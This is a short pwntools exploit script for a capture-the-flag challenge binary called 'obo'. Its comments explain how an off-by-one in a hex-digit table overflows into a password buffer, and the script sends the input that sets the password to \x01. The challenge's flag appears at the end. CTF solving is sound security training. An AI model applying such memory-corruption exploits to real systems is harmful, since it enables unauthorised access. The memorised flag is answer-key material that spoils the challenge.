#!/usr/bin/env python

from pwn import *

p = process('./obo')
print p.recv(1024).strip()
p.sendline('1234567890ABCDEFG')

# off by one error:
#
# for (i = 0; i <= 6; ++i) {
#   hex_table['A' + i] = 10 + i;
# }
#
# condition should be < 6, not <= 6; include G as valid character,
# with value 16, which causes digits[16] later on, which overflows into
# the password buffer, effectively setting the password to \x01

print p.recv(1024).strip()
p.sendline('\x01')
p.interactive()

# flag: watch_your_bounds